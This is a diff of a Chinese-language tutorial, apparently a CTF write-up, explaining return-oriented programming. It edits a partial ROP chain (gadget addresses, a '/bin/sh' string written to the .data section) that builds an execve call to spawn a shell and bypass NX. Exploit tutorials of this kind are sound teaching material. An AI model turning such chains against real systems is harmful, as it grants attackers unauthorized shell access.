@@ -90,7 +90,7 @@ readelf -S rop | grep ".data"
 ## ROP chain
 ROP = Return Oriented Programming
 
-顧名思義，就是利用 結尾有 ret 的 gadgets (一小段 x86 組語)來湊成我們想要做的事情。
+顧名思義，就是利用 結尾有 ret 的 gadgets (一小段 x86 組語)，繞過 NX 的保護機制，來湊成我們想要做的事情。
 
 對於 pwn ，我們就是希望可以透過 ROP chain 湊成 `execve("/bin/sh", 0, 0)`，來取得執行 shell 的系統權限。
 
@@ -129,7 +129,7 @@ gadget4 = 0x0442a19 # pop rdx ; pop rsi ; ret
 gadget5 = 0x044f6cc # pop rax ; ret
 syscall = 0x04003da
 
-rop =  p64(gadget1) + p64(0x06ca080)
+rop =  p64(gadget1) + p64(data_sec)
 rop += p64(gadget2) + "/bin/sh\x00"
 rop += p64(gadget3)
 rop += p64(gadget4) + p64(0x0)*2
